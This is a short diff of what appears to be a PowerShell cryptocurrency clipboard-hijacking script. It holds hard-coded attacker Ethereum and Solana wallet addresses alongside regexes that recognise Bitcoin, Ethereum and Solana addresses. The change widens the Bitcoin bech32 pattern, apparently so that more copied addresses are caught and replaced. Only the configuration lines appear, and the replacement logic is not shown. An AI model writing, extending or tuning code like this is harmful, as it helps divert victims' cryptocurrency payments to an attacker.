@@ -5,7 +5,7 @@ $myEth = "0x2fd35c82Eb26da57cF630314C031695343aCbC57"
 $mySol = "7fdf9h4fzL4uJJS6kKaBbA1qFyvWGYkH7b9h9F9oRwTS"
 
 $btcLegacyRegex = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'
-$btcBech32Regex = '(?i)^bc1[qp][a-z0-9]{38,58}$'
+$btcBech32Regex = '(?i)^bc1[qp][a-z0-9]{38,87}$'
 $ethRegex = '(?i)^0x[a-f0-9]{40}$'
 $solRegex = '^[1-9A-HJ-NP-Za-km-z]{32,44}$'
 
